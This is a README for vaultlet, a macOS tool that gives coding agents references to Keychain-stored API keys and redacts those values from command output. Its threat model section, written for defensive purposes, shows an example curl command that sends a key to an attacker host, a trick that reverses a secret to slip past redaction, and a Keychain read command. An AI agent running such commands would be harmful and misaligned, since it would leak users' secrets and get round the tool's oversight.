# vaultlet

Keep API keys out of your coding agent's transcript. vaultlet stores secrets in
the macOS Keychain and gives agents references (`vaultlet://stripe/API_KEY`)
instead of values. The value is only ever injected into the environment of a
child process, and that process's output is scrubbed before the agent sees it.

## The agent workflow

1. The agent calls `list_keys` / `has_secret` over MCP and sees only refs.
2. If a secret is missing, it calls `request_secret(group, key, reason)`. A
   local page opens in your browser; you type the value there. The tool
   returns the ref, not the value. Nothing is pasted into chat.
3. To use it, the agent runs the real command through vaultlet:

   ```sh
   vaultlet run --ref vaultlet://stripe/API_KEY -- sh -c 'curl -s https://api.stripe.com/v1/balance -u "$API_KEY:"'
   vaultlet run --group stripe -- ./deploy.sh
   ```

   The value goes into the child's environment. The child's stdout and stderr
   are streamed back with every injected value, and its base64 and
   URL-encoded forms, replaced by `«redacted:stripe/API_KEY»`.

There is no MCP tool and no CLI command that prints a value. That is the
design; see [Threat model](#threat-model) for what it does and does not buy you.

## Install

Requires macOS and Python 3 (tested on 3.12). The CLI uses only the standard
library. The MCP server needs `mcp` 1.x, run through `uv` so nothing is
installed into your environment.

```sh
git clone https://github.com/anhermon/vaultlet ~/src/vaultlet
ln -s ~/src/vaultlet/bin/vaultlet /usr/local/bin/vaultlet   # or add bin/ to PATH
brew install uv                                              # for the MCP server
```

## Quickstart

```sh
vaultlet ui                       # open the local page, create a group, add keys
vaultlet groups
vaultlet keys stripe              # key names and refs, no values
vaultlet run --group stripe -- sh -c 'echo "key length: ${#API_KEY}"'
```

## MCP setup (Claude Code)

```sh
claude mcp add vaultlet --scope user -- \
  uv run --directory /absolute/path/to/vaultlet --with "mcp==1.29.0" \
  python -m vaultlet.mcp_server
```

Equivalent `.mcp.json`:

```json
{
  "mcpServers": {
    "vaultlet": {
      "command": "uv",
      "args": ["run", "--directory", "/absolute/path/to/vaultlet",
               "--with", "mcp==1.29.0", "python", "-m", "vaultlet.mcp_server"]
    }
  }
}
```

`mcp` is pinned to 1.x because 2.0 removed `mcp.server.fastmcp`, which the
server uses. Tools: `list_groups`, `list_keys`, `has_secret`,
`request_secret`, `usage_hint`. All return names or refs, never values.

## CLI

```
vaultlet groups
vaultlet keys <group>
vaultlet ui [--port N]
vaultlet request <group> <key> [--reason TEXT]
vaultlet run [--group G]... [--ref vaultlet://g/k[=ENVNAME]]... -- <cmd> [args...]
```

`--group G` injects every key in G under its own name. `--ref` injects one key,
optionally under another env var name. `run` exits with the child's exit code.
`run` does not expand `$VARS` itself; wrap in `sh -c` if the command line needs
them. Group names match `[A-Za-z0-9_.-]+`; key names must be valid env var names.

## How it works

Values live in the Keychain: service `vaultlet:<group>`, account `<key>`. An
index of group and key names (no values) is kept in `~/.vaultlet/index.json`,
mode 0600. Writes pass the value to `security -i` on stdin, so it does not
appear in `ps`. The management page binds to 127.0.0.1 only, rejects requests
with a foreign `Host` or `Origin`, and its API never returns a value. Only
`vaultlet run` reads values back.

## Threat model

vaultlet protects against a secret *accidentally* landing in an agent
transcript, shell history, or log. It is not a sandbox against an agent that
wants the value.

- Anything running as your user can read the Keychain item with
  `security find-generic-password -w`. vaultlet adds no barrier there.
- The agent chooses the command that `vaultlet run` executes. A command such as
  `sh -c 'echo $API_KEY | rev'` defeats redaction, and
  `curl https://attacker.example -d "$API_KEY"` sends the value off-machine.
  Review what the agent runs, or gate `vaultlet run` behind your agent's
  permission prompts.
- The child process can read its own environment, and so can anything else
  running as you that can inspect it.
- Redaction is line-based. A value split across lines, or in a stream that never
  emits a newline, can pass through. Encodings other than raw, base64 and
  URL-quoted are not caught.
- Values shorter than 4 characters are not redacted (a warning is printed).
- Values cannot contain newlines.
- `request_secret` shows the agent-supplied `reason` text on the page. It is
  escaped, but a misleading reason can still talk you into entering a secret
  you should not. Read it.
- macOS only. There is no Linux or Windows backend.

See [SECURITY-REVIEW.md](SECURITY-REVIEW.md) for the review notes.

## How it differs, and when not to use it

- **envchain** stores secrets in the Keychain and injects them into a command's
  environment. That is vaultlet's `run`, minus refs, the MCP server, the entry
  page and output redaction. If you only want Keychain-to-env, use envchain.
- **1Password CLI (`op run`)** resolves `op://` references into a child's
  environment and can mask secrets in output. This is the closest design, and
  it is more mature, cross-platform, and supports teams, biometric unlock and
  rotation. If you already use 1Password, use it. vaultlet's difference is the
  agent-facing piece: MCP tools and a browser form so an agent can ask for a
  secret without seeing it.
- **Infisical, Doppler, HashiCorp Vault**: hosted or self-hosted secret
  managers with access control, audit logs, rotation and team sharing. Use these
  for anything shared or production. vaultlet is a single-user local store.
- **sops / age**: encrypted secret files you commit alongside code. A different
  problem (secrets in version control, for people and CI), and the decrypted
  value still reaches whatever reads the file.
- **direnv**: loads environment variables per directory. It has no secret
  storage and no redaction; the values end up in your shell.
- **Agent-specific tools**: several MCP servers and agent plugins expose secret
  managers to agents. I have not surveyed them exhaustively. Any that return
  values to the model put the value in the transcript, which is the case
  vaultlet exists to avoid.

Do not use vaultlet if you need Linux or Windows, team sharing, audit logging,
rotation, a hardened boundary against a hostile agent, or production secrets.

## Development

```sh
python3 -m unittest -v test_vaultlet
```

The Keychain round-trip test writes and deletes an item named
`vaultlet:vaultlet-test-integration`. Set `VAULTLET_SKIP_KEYCHAIN=1` to skip it.

## License

MIT. See [LICENSE](LICENSE).
